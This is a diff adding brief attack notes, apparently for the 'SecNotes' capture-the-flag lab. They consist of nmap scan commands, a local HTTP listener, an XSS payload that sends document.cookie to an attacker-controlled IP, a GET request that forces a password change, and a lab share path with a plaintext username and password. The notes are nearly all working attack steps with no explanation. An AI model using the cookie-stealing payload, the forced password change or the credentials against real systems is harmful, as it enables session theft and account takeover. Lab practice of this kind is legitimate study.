@@ -1,0 +1,14 @@
+nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.97 oG allPorts 
+
+nmap -sCV -pX,X X.X.X.X -oN targeted
+
+python3 -m http.server 8000
+
+<script>document.write('<img src="http://10.10.16.4:8080/imagen.jpg?cookie=' + document.cookie +' ">')</script>
+
+
+http://10.10.10.97/change_pass.php?password=fer321&confirm_password=fer321&submit=submit
+
+
+\\secnotes.htb\new-site
+tyler / 92g!mA8BGjOirkL%OG*&
